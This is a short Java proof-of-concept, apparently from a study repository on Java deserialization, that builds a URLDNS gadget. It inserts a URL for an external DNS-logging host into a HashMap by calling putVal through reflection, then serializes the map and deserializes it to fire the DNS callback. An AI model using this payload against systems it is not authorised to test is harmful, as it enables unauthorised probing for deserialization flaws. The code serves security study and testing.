package org.su18.serialize.ysoserial.URLDNS;

import org.su18.serialize.utils.SerializeUtil;

import java.lang.reflect.Method;
import java.net.URL;
import java.util.HashMap;

/**
 * 反射调用 HashMap 的 putVal 方法写入
 *
 * @author su18
 */
public class URLDNS2 {

	public static void main(String[] args) throws Exception {

		HashMap<URL, Integer> hashMap = new HashMap<>();
		URL                   url     = new URL("http://o10a07.dnslog.cn");

		Method[] m = Class.forName("java.util.HashMap").getDeclaredMethods();
		for (Method method : m) {
			if ("putVal".equals(method.getName())) {
				method.setAccessible(true);
				method.invoke(hashMap, -1, url, 0, false, true);
			}
		}

		SerializeUtil.writeObjectToFile(hashMap);
		SerializeUtil.readFileObject();
	}
}
